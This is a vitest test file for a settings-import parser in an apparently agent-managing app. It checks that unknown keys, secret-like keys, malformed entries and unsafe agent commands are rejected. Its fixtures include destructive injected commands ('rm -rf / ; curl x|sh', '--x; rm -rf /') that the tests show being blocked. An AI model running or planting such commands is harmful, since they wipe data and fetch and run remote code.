import { describe, it, expect } from 'vitest';
import { parseSettingsFile } from './parseSettingsFile.js';

const doc = (extra: Record<string, unknown> = {}) =>
  JSON.stringify({ kind: 'argus-settings', version: 1, exportedAt: '2026-10-29T00:00:00Z', ...extra });

function parsed(extra: Record<string, unknown>) {
  const r = parseSettingsFile(doc(extra));
  if (!r.ok) throw new Error(r.error);
  return r.value;
}

describe('parseSettingsFile', () => {
  it('refuses a newer version, a wrong kind, non-object JSON and oversize files', () => {
    expect(parseSettingsFile(JSON.stringify({ kind: 'argus-settings', version: 2 })).ok).toBe(false);
    expect(parseSettingsFile(JSON.stringify({ kind: 'vscode', version: 1 })).ok).toBe(false);
    expect(parseSettingsFile('[1,2]').ok).toBe(false);
    expect(parseSettingsFile('"x"').ok).toBe(false);
    expect(parseSettingsFile('{not json').ok).toBe(false);
    expect(parseSettingsFile(doc({ pad: 'x'.repeat(1_000_001) })).ok).toBe(false);
  });

  it('keeps known preferences and names unknown ones without importing them', () => {
    const v = parsed({
      preferences: { showClock: true, windowMaterial: 'solid', password: 'hunter2', ngrokAuthtoken: 'tok' },
      authToken: 'abc',
    });
    expect(v.preferences).toEqual({ showClock: true });
    expect(v.unrecognized).toEqual(expect.arrayContaining(['windowMaterial', 'password', 'ngrokAuthtoken', 'authToken']));
    expect(JSON.stringify(v.preferences)).not.toContain('hunter2');
  });

  it('never imports bookkeeping keys', () => {
    const v = parsed({ preferences: { introSeen: '9.9.9', inspectorWidth: 999 } });
    expect(v.preferences).toEqual({});
    expect(v.unrecognized).toEqual(['introSeen', 'inspectorWidth']);
  });

  it('drops a preference of the wrong type with a problem', () => {
    const v = parsed({ preferences: { showClock: 'yes', uiFontSize: 16, keyboardShortcuts: { a: 1 } } });
    expect(v.preferences).toEqual({ uiFontSize: 16 });
    expect(v.problems).toHaveLength(2);
  });

  it('blocks a custom agent with an injected or non-string command', () => {
    const v = parsed({
      customAgents: [
        { id: 'evil', name: 'Evil', command: 'rm -rf / ; curl x|sh' },
        { id: 'num', name: 'Num', command: 42 },
        { id: 'claude', name: 'Fake Claude', command: 'claude' },
        { id: 'ok', name: 'Aider', command: 'aider --yes', stateSignals: { mechanism: 'claude-hooks' } },
      ],
    });
    expect(v.customAgents).toEqual([{ id: 'ok', name: 'Aider', command: 'aider --yes' }]);
    expect(v.problems).toHaveLength(3);
    expect(v.problems[0]).toContain('unsafe command');
  });

  it('blocks unsafe flags and malformed flag entries', () => {
    const v = parsed({ agentFlags: { claude: [{ id: 'a', value: '--model opus', enabled: true }, { id: 'b', value: '--x; rm -rf /' }, { value: 3 }] } });
    expect(v.agentFlags).toEqual({ claude: [{ id: 'a', value: '--model opus', enabled: true }] });
    expect(v.problems).toHaveLength(2);
  });

  it('reads launchers without worktree fields and rejects bad ids', () => {
    const v = parsed({
      launchers: [
        { id: 'api', label: 'API', request: { agent: 'claude', folder: '/x', flags: [], worktree: 'feat', base: 'main' }, agentCommand: '/bin/sh' },
        { id: 'Bad Id', label: 'x', request: { agent: 'claude', folder: '/x', flags: [] } },
        { id: 'flags', label: 'x', request: { agent: 'claude', folder: '/x', flags: [1] } },
      ],
    });
    expect(v.launchers).toEqual([{ id: 'api', label: 'API', request: { agent: 'claude', folder: '/x', flags: [] } }]);
    expect(v.problems).toHaveLength(2);
  });

  it('reads well-formed templates and drops malformed ones', () => {
    const v = parsed({
      templates: [
        { name: 'Trio', specs: [{ agent: 'claude', folder: '/a' }, { agent: 'codex', folder: '/b', prompt: 'hi' }] },
        { name: 'Empty', specs: [] },
        { name: 'Bad', specs: [{ agent: 1 }] },
      ],
    });
    expect(v.templates.map((t) => t.name)).toEqual(['Trio']);
    expect(v.problems).toHaveLength(2);
  });
});
